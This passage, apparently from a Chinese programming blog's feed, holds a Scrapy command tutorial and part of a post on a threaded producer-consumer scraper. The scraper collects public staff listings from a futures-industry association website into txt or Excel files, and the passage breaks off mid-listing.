scrapy</code></pre><p>or <code>conda</code></p><pre><code class="node">conda install -c conda-forge scrapy</code></pre><p>基本指令如下：</p><pre><code class="js">D:\WorkSpace&gt;scrapy --helpScrapy 1.5.0 - no active projectUsage:  scrapy &lt;command&gt; [options] [args]Available commands:  bench         Run quick benchmark test  fetch         Fetch a URL using the Scrapy downloader  genspider     Generate new spider using pre-defined templates  runspider     Run a self-contained spider (without creating a project)  settings      Get settings values  shell         Interactive scraping console  startproject  Create new project  version       Print Scrapy version  view          Open URL in browser, as seen by Scrapy  [ more ]      More commands available when run from project directoryUse &quot;scrapy &lt;command&gt; -h&quot; to see more info about a command</code></pre><p>如果需要使用虚拟环境，需要安装<code>virtualenv</code></p><pre><code class="node">pip install virtualenv</code></pre><h2 id="scrapy-startproject"><a href="#scrapy-startproject" class="headerlink" title="scrapy startproject"></a>scrapy startproject</h2><pre><code class="sh">scrapy startproject &lt;project-name&gt; [project-dir]</code></pre><p>使用该指令可以生成一个新的<code>scrapy</code>项目，以<code>demo</code>为例</p><pre><code class="sh">$ scrapy startproject demo...You can start your first spider with:    cd demo    scrapy genspider example example.com$ cd demo$ tree.├── demo│   ├── __init__.py│   ├── items.py│   ├── middlewares.py│   ├── pipelines.py│   ├── __pycache__│   ├── settings.py│   └── spiders│       ├── __init__.py│       └── __pycache__└── scrapy.cfg4 directories, 7 files</code></pre><p>可以看到<code>startproject</code>自动生成了一些文件夹和文件，其中：</p><ol><li><code>scrapy.cfg</code>: 项目配置文件，一般不用修改</li><li><code>items.py</code>: 定义<code>items</code>的文件，例如上述的<code>GoodsItem</code></li><li><code>middlewares.py</code>: 中间件代码，默认包含下载器中间件和爬虫中间件</li><li><code>pipelines.py</code>: 项目管道，用于处理<code>spider</code>返回的<code>items</code>，包括清洗，验证，持久化等</li><li><code>settings.py</code>: 全局配置文件，包含各类全局变量</li><li><code>spiders</code>: 该文件夹用于存储所有的爬虫文件，注意一个项目可以包含多个爬虫</li><li><code>__init__.py</code>: 该文件指示当前文件夹属于一个<code>python</code>模块</li><li><code>__pycache__</code>: 存储解释器生成的<code>.pyc</code>文件（一种跨平台的字节码<code>byte code</code>），在<code>python2</code>中该类文件与<code>.py</code>保存在相同文件夹</li></ol><h2 id="scrapy-genspider"><a href="#scrapy-genspider" class="headerlink" title="scrapy genspider"></a>scrapy genspider</h2><p>项目生成以后，可以使用<code>scrapy genspider</code>指令自动生成一个爬虫文件，比如，如果要爬取<a href="www.huaban.com">花瓣网首页</a>，执行以下指令：</p><pre><code class="sh">cd demoscrapy genspider huaban www.huaban.com</code></pre><p>默认生成的爬虫文件<code>huaban.py</code>如下：</p><pre><code class="python"># -*- coding: utf-8 -*-import scrapyclass HuabanSpider(scrapy.Spider):    name = &#39;huaban&#39;    allowed_domains = [&#39;www.huaban.com&#39;]    start_urls = [&#39;http://www.huaban.com/&#39;]    def parse(self, response):        pass</code></pre><ul><li>爬虫类继承于<code>scrapy.Spider</code></li><li><code>name</code>是必须存在的参数，用以标识该爬虫</li><li><code>allowed_domains</code>指代允许爬虫爬取的域名，指定域名之外的链接将被丢弃</li><li><code>start_urls</code>存储爬虫的起始链接，该参数是列表类型，所以可以同时存储多个链接</li></ul><p>如果要自定义起始链接，也可以重写<code>scrapy.Spider</code>类的<code>start_requests</code>函数，此处不予细讲。</p><p><code>parse</code>函数是一个默认的回调函数，当下载器下载网页后，会调用该函数进行解析，<code>response</code>就是请求包的响应数据。至于网页内容的解析方法，<code>scrapy</code>内置了几种选择器(<code>Selector</code>)，包括<code>xpath</code>选择器、<code>CSS</code>选择器和正则匹配。下面是一些选择器的使用示例，方便大家更加直观的了解选择器的用法。</p><pre><code class="python"># xpath selectorresponse.xpath(&#39;//a&#39;)response.xpath(&#39;./img&#39;).extract()response.xpath(&#39;//*[@id=&quot;huaban&quot;]&#39;).extract_first()repsonse.xpath(&#39;//*[@id=&quot;Profile&quot;]/div[1]/a[2]/text()&#39;).extract_first()# css selectorresponse.css(&#39;a&#39;).extract()response.css(&#39;#Profile &gt; div.profile-basic&#39;).extract_first()response.css(&#39;a[href=&quot;test.html&quot;]::text&#39;).extract_first()# re selectorresponse.xpath(&#39;.&#39;).re(&#39;id:\s*(\d+)&#39;)response.xpath(&#39;//a/text()&#39;).re_first(&#39;username: \s(.*)&#39;)</code></pre><p>需要说明的是，<code>response</code>不能直接调用<code>re</code>,<code>re_first</code>.</p><h2 id="scrapy-crawl"><a href="#scrapy-crawl" class="headerlink" title="scrapy crawl"></a>scrapy crawl</h2><p>假设爬虫编写完了，那就可以使用<code>scrapy crawl</code>指令开始执行爬取任务了。</p><p>当进入一个创建好的<code>scrapy</code>项目目录时，使用<code>scrapy -h</code>可以获得相比未创建之前更多的帮助信息，其中就包括用于启动爬虫任务的<code>scrapy crawl</code></p><pre><code class="sh">$ scrapy -hScrapy 1.5.0 - project: huabanUsage:  scrapy &lt;command&gt; [options] [args]Available commands:  bench         Run quick benchmark test  check         Check spider contracts  crawl         Run a spider  edit          Edit spider  fetch         Fetch a URL using the Scrapy downloader  genspider     Generate new spider using pre-defined templates  list          List available spiders  parse         Parse URL (using its spider) and print the results  runspider     Run a self-contained spider (without creating a project)  settings      Get settings values  shell         Interactive scraping console  startproject  Create new project  version       Print Scrapy version  view          Open URL in browser, as seen by ScrapyUse &quot;scrapy &lt;command&gt; -h&quot; to see more info about a command</code></pre><pre><code class="sh">$ scrapy crawl -hUsage=====  scrapy crawl [options] &lt;spider&gt;Run a spiderOptions=======--help, -h              show this help message and exit-a NAME=VALUE           set spider argument (may be repeated)--output=FILE, -o FILE  dump scraped items into FILE (use - for stdout)--output-format=FORMAT, -t FORMAT                        format to use for dumping items with -oGlobal Options----------------logfile=FILE          log file. if omitted stderr will be used--loglevel=LEVEL, -L LEVEL                        log level (default: DEBUG)--nolog                 disable logging completely--profile=FILE          write python cProfile stats to FILE--pidfile=FILE          write process ID to FILE--set=NAME=VALUE, -s NAME=VALUE                        set/override setting (may be repeated)--pdb                   enable pdb on failure</code></pre><p>从<code>scrapy crawl</code>的帮助信息可以看出，该指令包含很多可选参数，但必选参数只有一个，就是<code>spider</code>，即要执行的爬虫名称，对应每个爬虫的名称(<code>name</code>)。</p><pre><code class="sh">scrapy crawl huaban</code></pre><p>至此，一个<code>scrapy</code>爬虫任务的创建和执行过程就介绍完了，至于实例，后续博客会陆续介绍。</p><h2 id="scrapy-shell"><a href="#scrapy-shell" class="headerlink" title="scrapy shell"></a>scrapy shell</h2><p>最后简要说明一下指令<code>scrapy shell</code>，这是一个交互式的<code>shell</code>,类似于命令行形式的<code>python</code>，当我们刚开始学习<code>scrapy</code>或者刚开始爬取某个陌生的站点时，可以使用它熟悉各种函数操作或者选择器的使用，用它来不断试错纠错，熟练掌握<code>scrapy</code>各种用法。</p><pre><code class="sh">$ scrapy shell www.huaban.com2018-05-29 23:58:49 [scrapy.utils.log] INFO: Scrapy 1.5.0 started (bot: scrapybot)2018-05-29 23:58:49 [scrapy.utils.log] INFO: Versions: lxml 4.2.1.0, libxml2 2.9.5, cssselect 1.0.3, parsel 1.4.0, w3lib 1.19.0, Twisted 17.9.0, Python 3.6.3 (v3.6.3:2c5fed8, Oct  32017, 17:26:49) [MSC v.1900 32 bit (Intel)], pyOpenSSL 17.5.0 (OpenSSL 1.1.0h  27 Mar 2018), cryptography 2.2.2, Platform Windows-10-10.0.17134-SP02018-05-29 23:58:49 [scrapy.crawler] INFO: Overridden settings: &#123;&#39;DUPEFILTER_CLASS&#39;: &#39;scrapy.dupefilters.BaseDupeFilter&#39;, &#39;LOGSTATS_INTERVAL&#39;: 0&#125;2018-05-29 23:58:49 [scrapy.middleware] INFO: Enabled extensions:[&#39;scrapy.extensions.corestats.CoreStats&#39;, &#39;scrapy.extensions.telnet.TelnetConsole&#39;]2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled downloader middlewares:[&#39;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&#39;, &#39;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&#39;, &#39;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&#39;, &#39;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&#39;, &#39;scrapy.downloadermiddlewares.retry.RetryMiddleware&#39;, &#39;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&#39;, &#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;, &#39;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&#39;, &#39;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&#39;, &#39;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&#39;, &#39;scrapy.downloadermiddlewares.stats.DownloaderStats&#39;]2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled spider middlewares:[&#39;scrapy.spidermiddlewares.httperror.HttpErrorMiddleware&#39;, &#39;scrapy.spidermiddlewares.offsite.OffsiteMiddleware&#39;, &#39;scrapy.spidermiddlewares.referer.RefererMiddleware&#39;, &#39;scrapy.spidermiddlewares.urllength.UrlLengthMiddleware&#39;, &#39;scrapy.spidermiddlewares.depth.DepthMiddleware&#39;]2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled item pipelines:[]2018-05-29 23:58:50 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:60232018-05-29 23:58:50 [scrapy.core.engine] INFO: Spider opened2018-05-29 23:58:50 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (301) to &lt;GET http://huaban.com/&gt; from &lt;GET http://www.huaban.com&gt;2018-05-29 23:58:50 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://huaban.com/&gt; (referer: None)[s] Available Scrapy objects:[s]   scrapy     scrapy module (contains scrapy.Request, scrapy.Selector, etc)[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x03385CB0&gt;[s]   item       &#123;&#125;[s]   request    &lt;GET http://www.huaban.com&gt;[s]   response   &lt;200 http://huaban.com/&gt;[s]   settings   &lt;scrapy.settings.Settings object at 0x04CC4D10&gt;[s]   spider     &lt;DefaultSpider &#39;default&#39; at 0x4fa6bf0&gt;[s] Useful shortcuts:[s]   fetch(url[, redirect=True]) Fetch URL and update local objects (by default, redirects are followed)[s]   fetch(req)                  Fetch a scrapy.Request and update local objects[s]   shelp()           Shell help (print this help)[s]   view(response)    View response in a browserIn [1]: view(response)Out[1]: TrueIn [2]: response.xpath(&#39;//a&#39;)Out[2]:[&lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a id=&quot;elevator&quot; class=&quot;off&quot; onclick=&quot;re&#39;&gt;, &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;plus&quot;&gt;&lt;/a&gt;&#39;&gt;, &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a onclick=&quot;app.showUploadDialog();&quot;&gt;添加采&#39;&gt;, &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;add-board-item&quot;&gt;添加画板&lt;i class=&quot;&#39;&gt;, &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a href=&quot;/about/goodies/&quot;&gt;安装采集工具&lt;i class&#39;&gt;, &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;huaban_security_oauth&quot; logo_si&#39;&gt;]In [3]: response.xpath(&#39;//a&#39;).extract()Out[3]:[&#39;&lt;a id=&quot;elevator&quot; class=&quot;off&quot; onclick=&quot;return false;&quot; title=&quot;回到顶部&quot;&gt;&lt;/a&gt;&#39;, &#39;&lt;a class=&quot;plus&quot;&gt;&lt;/a&gt;&#39;, &#39;&lt;a onclick=&quot;app.showUploadDialog();&quot;&gt;添加采集&lt;i class=&quot;upload&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;, &#39;&lt;a class=&quot;add-board-item&quot;&gt;添加画板&lt;i class=&quot;add-board&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;, &#39;&lt;a href=&quot;/about/goodies/&quot;&gt;安装采集工具&lt;i class=&quot;goodies&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;, &#39;&lt;a class=&quot;huaban_security_oauth&quot; logo_size=&quot;124x47&quot; logo_type=&quot;realname&quot; href=&quot;//www.anquan.org&quot; rel=&quot;nofollow&quot;&gt; &lt;script src=&quot;//static.anquan.org/static/outer/js/aq_auth.js&quot;&gt;&lt;/script&gt; &lt;/a&gt;&#39;]In [4]: response.xpath(&#39;//img&#39;)Out[4]: [&lt;Selector xpath=&#39;//img&#39; data=&#39;&lt;img src=&quot;https://d5nxst8fruw4z.cloudfro&#39;&gt;]In [5]: response.xpath(&#39;//a/text()&#39;)Out[5]:[&lt;Selector xpath=&#39;//a/text()&#39; data=&#39;添加采集&#39;&gt;, &lt;Selector xpath=&#39;//a/text()&#39; data=&#39;添加画板&#39;&gt;, &lt;Selector xpath=&#39;//a/text()&#39; data=&#39;安装采集工具&#39;&gt;, &lt;Selector xpath=&#39;//a/text()&#39; data=&#39; &#39;&gt;, &lt;Selector xpath=&#39;//a/text()&#39; data=&#39; &#39;&gt;]In [6]: response.xpath(&#39;//a/text()&#39;).extract()Out[6]: [&#39;添加采集&#39;, &#39;添加画板&#39;, &#39;安装采集工具&#39;, &#39; &#39;, &#39; &#39;]In [7]: response.xpath(&#39;//a/text()&#39;).extract_first()Out[7]: &#39;添加采集&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
            <tag> scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫3 - 生产者消费者模型爬取某金融网站数据</title>
      <link href="2018/04/30/cfachina/"/>
      <url>2018/04/30/cfachina/</url>
      
        <content type="html"><![CDATA[<p>应一位金融圈的朋友所托，帮忙写个爬虫，帮他爬取<a href="http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo#">中国期货行业协议</a>网站中所有金融机构的从业人员信息。网站数据的获取本身比较简单，但是为了学习一些新的爬虫方法和技巧，即本文要讲述的<strong>生产者消费者模型</strong>，我又学习了一下Python中队列库<code>queue</code>及线程库<code>Thread</code>的使用方法。</p><h2 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型"></a>生产者消费者模型</h2><p>生产者消费者模型非常简单，相信大部分程序员都知道，就是一方作为生产者不断提供资源，另一方作为消费者不断消费资源。简单点说，就好比餐馆的厨师和顾客，厨师作为生产者不断制作美味的食物，而顾客作为消费者不断食用厨师提供的食物。此外，生产者与消费者之间可以是一对一、一对多、多对一和多对多的关系。</p><p>那么这个模型和爬虫有什么关系呢？其实，爬虫可以认为是一个生产者，它不断从网站爬取数据，爬取到的数据就是食物；而所得数据需要消费者进行数据清洗，把有用的数据吸收掉，把无用的数据丢弃。</p><p>在实践过程中，爬虫爬取和数据清洗分别对应一个<code>Thread</code>，两个线程之间通过顺序队列<code>queue</code>传递数据，数据传递过程就好比餐馆服务员从厨房把食物送到顾客餐桌上的过程。爬取线程负责爬取网站数据，并将原始数据存入队列，清洗线程从队列中按入队顺序读取原始数据并提取出有效数据。</p><p>以上便是对生产者消费者模型的简单介绍了，下面针对本次爬取任务予以详细说明。</p><h2 id="分析站点"><a href="#分析站点" class="headerlink" title="分析站点"></a>分析站点</h2><blockquote><p><a href="http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo">http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo</a></p></blockquote><p><img src="/assets/spider/cfachina/home_page.png" alt="home page"></p><p>我们要爬取的数据是主页显示的表格中所有期货公司的<strong>从业人员信息</strong>，每个公司对应一个<strong>机构编号</strong>(<code>G01001~G01198</code>)。从上图可以看到有主页有分页，共8页。以<code>G01001</code>方正中期期货公司为例，点击该公司名称跳转至对应网页如下:</p><p><img src="/assets/spider/cfachina/personinfo.png" alt="personinfo"></p><p>从网址及网页内容可以提取出以下信息：</p><ol><li>网址<ul><li><a href="http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo">http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo</a><ul><li><code>organid</code>: 机构编号，<code>+G01001+</code> ~ <code>+G01198+</code></li><li><code>currentPage</code>: 该机构从业人员信息当前页面编号</li><li><code>pageSize</code>: 每个页面显示的人员个数，默认20</li><li><code>selectType</code>: 固定为<code>personinfo</code></li></ul></li></ul></li><li>机构名称<code>mechanism_name</code>，在每页表格上方可以看到当前机构名称</li><li>从业人员信息，即每页的表格内容，也是我们要爬取的对象</li><li>该机构从业人员信息总页数<code>page_cnt</code></li></ol><p>我们最终爬取的数据可以按机构名称存储到对应的txt文件或excel文件中。</p><h3 id="获取机构名称"><a href="#获取机构名称" class="headerlink" title="获取机构名称"></a>获取机构名称</h3><p><img src="/assets/spider/cfachina/gst_title.png" alt="get mechanism name"></p><p>获取到某机构的任意从业信息页面后，使用<code>BeautifulSoup</code>可快速提取机构名称。</p><pre><code class="python">mechanism_name = soup.find(&#39;&#39;, &#123;&#39;class&#39;:&#39;gst_title&#39;&#125;).find_all(&#39;a&#39;)[2].get_text()</code></pre><p>那么有人可能会问，既然主页表格都已经包含了所有机构的编号和名称，为何还要多此一举的再获取一次呢？这是因为，我压根就不想爬主页的那些表格，直接根据机构编号的递增规律生成对应的网址即可，所以获取机构名称的任务就放在了爬取每个机构首个信息页面之后。</p><h3 id="获取机构信息对应的网页数量"><a href="#获取机构信息对应的网页数量" class="headerlink" title="获取机构信息对应的网页数量"></a>获取机构信息对应的网页数量</h3><p><img src="/assets/spider/cfachina/page_cnt.png" alt="get count of page"></p><p>每个机构的数据量是不等的，幸好每个页面都包含了当前页面数及总页面数。使用以下代码即可获取页码数。</p><pre><code class="python">url_re = re.compile(&#39;#currentPage.*\+.*\+\&#39;(\d+)\&#39;&#39;)page_cnt = url_re.search(html).group(1)</code></pre><p>从每个机构首页获取页码数后，便可<code>for</code>循环修改网址参数中的<code>currentPage</code>，逐页获取机构信息。</p><h3 id="获取当前页面从业人员信息"><a href="#获取当前页面从业人员信息" class="headerlink" title="获取当前页面从业人员信息"></a>获取当前页面从业人员信息</h3><p><img src="/assets/spider/cfachina/personinfo_table.png" alt="get personinfo"></p><p>针对如上图所示的一个特定信息页时，人员信息被存放于一个表中，除了固定的表头信息外，人员信息均被包含在一个带有<code>id</code>的<code>tr</code>标签中，所以使用<code>BeautifulSoup</code>可以很容易提取出页面内所有人员信息。</p><pre><code class="python">soup.find_all(&#39;tr&#39;, id=True)</code></pre><h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><p>一般的想法当然是逐页爬取主页信息，然后获取每页所有机构对应的网页链接，进而继续爬取每个机构信息。</p><p>但是由于该网站的机构信息网址具有明显的规律，我们根据每个机构的编号便可直接得到每个机构每个信息页面的网址。所以具体爬取方案如下：</p><ol><li>将所有<strong>机构编号</strong>网址存入队列<code>url_queue</code></li><li>新建生产者线程<code>SpiderThread</code>完成抓取任务<ul><li>循环从队列<code>url_queue</code>中读取一个编号，生成机构首页网址，使用<code>requests</code>抓取之</li><li>从抓取结果中获取页码数量，若为0，则返回该线程第1步</li><li>循环爬取当前机构剩余页面</li><li>将页面信息存入队列<code>html_queue</code></li></ul></li><li>新建消费者线程<code>DatamineThread</code>完成数据清洗任务<ul><li>循环从队列<code>html_queue</code>中读取一组页面信息</li><li>使用<code>BeautifulSoup</code>提取页面中的从业人员信息</li><li>将信息以二维数组形式存储，最后交由数据存储类<code>Storage</code>存入本地文件</li></ul></li></ol><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="生成者SpiderThread"><a href="#生成者SpiderThread" class="headerlink" title="生成者SpiderThread"></a>生成者<code>SpiderThread</code></h3><p>爬虫线程先从队列获取一个机构编号，生成机构首页网址并进行爬取，接着判断机构页面数量是否为0，如若不为0则继续获取机构名称，并根据页面数循环爬取剩余页面，将原始html数据以如下<code>dict</code>格式存入队列<code>html_queue</code>:</p><pre><code class="json">&#123;    &#39;name&#39;: mechanismId_mechanismName,    &#39;num&#39;: currentPage,    &#39;content&#39;: html&#125;</code></pre><p>爬虫产生的数据队列<code>html_queue</code>将由数据清洗线程进行处理，下面是爬虫线程的主程序，整个线程代码请看后面的<a href="#%E6%BA%90%E7%A0%81">源码</a>。</p><pre><code class="python">def run(self):    while True:        mechanism_id = &#39;G0&#39; + self.url_queue.get()        # the first page&#39;s url        url = self.__get_url(mechanism_id, 1)        html = self.grab(url)        page_cnt = self.url_re.search(html.text).group(1)        if page_cnt == &#39;0&#39;:            self.url_queue.task_done()            continue        soup = BeautifulSoup(html.text, &#39;html.parser&#39;)        mechanism_name = soup.find(&#39;&#39;, &#123;&#39;class&#39;:&#39;gst_title&#39;&#125;).find_all(&#39;a&#39;)[2].get_text()        print(&#39;\nGrab Thread: get %s - %s with %s pages\n&#39; % (mechanism_id, mechanism_name, page_cnt))        # put data into html_queue        self.html_queue.put(&#123;&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:1, &#39;content&#39;:html&#125;)        for i in range(2, int(page_cnt) + 1):            url = self.__get_url(mechanism_id, i)            html = self.grab(url)            self.html_queue.put(&#123;&#39;name&#39;:&#39;%s_%s&#39; % (mechanism_id, mechanism_name), &#39;num&#39;:i, &#39;content&#39;:html&#125;)        self.url_queue.task_done()</code></pre><h3 id="消费者DatamineThread"><a href="#消费者DatamineThread" class="headerlink" title="消费者DatamineThread"></a>消费者<code>DatamineThread</code></h3><p>数据清洗线程比较简单，就是从生产者提供的数据队列<code>html_queue</code>逐一提取<code>html</code>数据，然后从<code>html</code>数据中提取从业人员信息，以二维数组形式存储，最后交由存储模块<code>Storage</code>完成数据存储工作。</p><pre><code class="python">class DatamineThread(Thread):    &quot;&quot;&quot;Parse data from html&quot;&quot;&quot;    def __init__(self, html_queue, filetype):        Thread.__init__(self)        self.html_queue = html_queue        self.filetype = filetype    def __datamine(self, data):        &#39;&#39;&#39;Get data from html content&#39;&#39;&#39;        soup = BeautifulSoup(data[&#39;content&#39;].text, &#39;html.parser&#39;)        infos = []        for info in soup.find_all(&#39;tr&#39;, id=True):            items = []            for item in info.find_all(&#39;td&#39;):                items.append(item.get_text())            infos.append(items)        return infos    def run(self):        while True:            data = self.html_queue.get()            print(&#39;Datamine Thread: get %s_%d&#39; % (data[&#39;name&#39;], data[&#39;num&#39;]))            store = Storage(data[&#39;name&#39;], self.filetype)            store.save(self.__datamine(data))            self.html_queue.task_done()</code></pre><h3 id="数据存储Storage"><a href="#数据存储Storage" class="headerlink" title="数据存储Storage"></a>数据存储<code>Storage</code></h3><p>我写了两类文件格式的存储函数，<code>write_txt</code>, <code>write_excel</code>，分别对应<code>txt</code>,<code>excel</code>文件。实际存储时由调用方确定文件格式。</p><pre><code class="python">def save(self, data):    &#123;        &#39;.txt&#39;: self.write_txt,        &#39;.xls&#39;: self.write_excel    &#125;.get(self.filetype)(data)</code></pre><h4 id="存入txt文件"><a href="#存入txt文件" class="headerlink" title="存入txt文件"></a>存入txt文件</h4><p>存入<code>txt</code>文件是比较简单的，就是以附加(<code>a</code>)形式打开文件，写入数据，关闭文件。其中，文件名称由调用方提供。写入数据时，每个人员信息占用一行，以制表符<code>\t</code>分隔。</p><pre><code class="python">def write_txt(self, data):    &#39;&#39;&#39;Write data to txt file&#39;&#39;&#39;    fid = open(self.path, &#39;a&#39;, encoding=&#39;utf-8&#39;)    # insert the header of table    if not os.path.getsize(self.path):        fid.write(&#39;\t&#39;.join(self.table_header) + &#39;\n&#39;)    for info in data:        fid.write(&#39;\t&#39;.join(info) + &#39;\n&#39;)    fid.close()</code></pre><h4 id="存入Excel文件"><a href="#存入Excel文件" class="headerlink" title="存入Excel文件"></a>存入Excel文件</h4><p>存入<code>Excel</code>文件还是比较繁琐的，由于经验不多，选用的是<code>xlwt</code>, <code>xlrd</code>和<code>xlutils</code>库。说实话，这3个库真心不大好用，勉强完成任务而已。为什么这么说，且看：</p><ol><li>修改文件麻烦：<code>xlwt</code>只能写,<code>xlrd</code>只能读，需要<code>xlutils</code>的<code>copy</code>函数将<code>xlrd</code>读取的数据复制到内存，再用<code>xlwt</code>修改</li><li>只支持<code>.xls</code>文件：<code>.xlsx</code>经读写也会变成<code>.xls</code>格式</li><li>表格样式易变：只要重新写入文件，表格样式必然重置</li></ol><p>所以后续我肯定会再学学其它的<code>excel</code>库，当然，当前解决方案暂时还用这三个。代码如下：</p><pre><code class="python">def write_excel(self, data):    &#39;&#39;&#39;write data to excel file&#39;&#39;&#39;    if not os.path.exists(self.path):        header_style = xlwt.easyxf(&#39;font:name 楷体, color-index black, bold on&#39;)        wb = xlwt.Workbook(encoding=&#39;utf-8&#39;)        ws = wb.add_sheet(&#39;Data&#39;)        # insert the header of table        for i in range(len(self.table_header)):            ws.write(0, i, self.table_header[i], header_style)    else:        rb = open_workbook(self.path)        wb = copy(rb)        ws = wb.get_sheet(0)    # write data    offset = len(ws.rows)    for i in range(0, len(data)):        for j in range(0, len(data[0])):            ws.write(offset + i, j, data[i][j])    # When use xlutils.copy.copy function to copy data from exist .xls file,    # it will loss the origin style, so we need overwrite the width of column,    # maybe there some other good solution, but I have not found yet.    for i in range(len(self.table_header)):        ws.col(i).width = 256 * (10, 10, 15, 20, 50, 20, 15)[i]    # save to file    while True:        try:            wb.save(self.path)            break        except PermissionError as e:            print(&#39;&#123;0&#125; error: &#123;1&#125;&#39;.format(self.path, e.strerror))            time.sleep(5)        finally:            pass</code></pre><p>说明：</p><ol><li>一个文件对应一个机构的数据，需要多次读取和写入，所以需要计算文件写入时的行数偏移量<code>offset</code>，即当前文件已包含数据的行数；</li><li>当被写入文件被人为打开时，会出现<code>PermissionError</code>异常，可以在捕获该异常然后提示错误信息，并定时等待直到文件被关闭。</li></ol><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>主函数用于创建和启动生产者线程和消费者线程，同时为生产者线程提供机构编号队列。</p><pre><code class="python">url_queue = queue.Queue()html_queue = queue.Queue()def main():    for i in range(1001, 1199):        url_queue.put(str(i))    # create and start a spider thread    st = SpiderThread(url_queue, html_queue)    st.setDaemon(True)    st.start()    # create and start a datamine thread    dt = DatamineThread(html_queue, &#39;.xls&#39;)    dt.setDaemon(True)    dt.start()    # wait on the queue until everything has been processed    url_queue.join()    html_queue.join()</code></pre><p>从主函数可以看到，两个队列都调用了<code>join</code>函数，用于阻塞，直到对应队列为空为止。要注意的是，队列操作中，<strong>每个出队操作<code>queue.get()</code>需要对应一个<code>queue.task_done()</code>操作</strong>，否则会出现队列数据已全部处理完，但主线程仍在执行的情况。</p><p>至此，爬虫的主要代码便讲解完了，下面是完整源码。</p><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code class="python">#!/usr/bin/python3# -*-coding:utf-8-*-import queuefrom threading import Threadimport requestsimport refrom bs4 import BeautifulSoupimport osimport platformimport xlwtfrom xlrd import open_workbookfrom xlutils.copy import copyimport time# url format ↓# http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo&amp;all=undefined# organid: +G01001+, +G01002+, +G01003+, ...# currentPage: 1, 2, 3, ...# pageSize: 20(default)## Algorithm design:# 2 threads with 2 queues# Thread-1, get first page url, then get page_num and mechanism_name from first page# Thread-2, parse html file and get data from it, then output data to local file# url_queue data -&gt; &#39;url&#39;  # first url of each mechanism# html_queue data -&gt; &#123;&#39;name&#39;:&#39;mechanism_name&#39;, &#39;html&#39;:data&#125;url_queue = queue.Queue()html_queue = queue.Queue()class SpiderThread(Thread):    &quot;&quot;&quot;Threaded Url Grab&quot;&quot;&quot;    def __init__(self, url_queue, html_queue):        Thread.__init__(self)        self.url_queue = url_queue        self.html_queue = html_queue        self.page_size = 20        self.url_re = re.compile(&#39;#currentPage.*\+.*\+\&#39;(\d+)\&#39;&#39;)        self.headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&#39;&#125;    def __get_url(self, mechanism_id, current_page):        return &#39;http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+%s+&amp;currentPage=%d&amp;pageSize=%d&amp;selectType=personinfo&amp;all=undefined&#39; \        % (mechanism_id, current_page, self.page_size)    def grab(self, url):        &#39;&#39;&#39;Grab html of url from web&#39;&#39;&#39;        while True:            try:                html = requests.get(url, headers=self.headers, timeout=20)                if html.status_code == 200:                    break            except requests.exceptions.ConnectionError as e:                print(url + &#39; Connection error, try again...&#39;)            except requests.exceptions.ReadTimeout as e:                print(url + &#39; Read timeout, try again...&#39;)            except Exception as e:                print(str(e))            finally:                pass        return html    def run(self):        &#39;&#39;&#39;Grab all htmls of mechanism one by one        Steps:            1. grab first page of each mechanism from url_queue            2. get number of pages and mechanism name from first page            3. grab all html file of each mechanism            4. push all html to html_queue        &#39;&#39;&#39;        while True:            mechanism_id = &#39;G0&#39; + self.url_queue.get()            # the first page&#39;s url            url = self.__get_url(mechanism_id, 1)            html = self.grab(url)            page_cnt = self.url_re.search(html.text).group(1)            if page_cnt == &#39;0&#39;:                self.url_queue.task_done()                continue            soup = BeautifulSoup(html.text, &#39;html.parser&#39;)            mechanism_name = soup.find(&#39;&#39;, 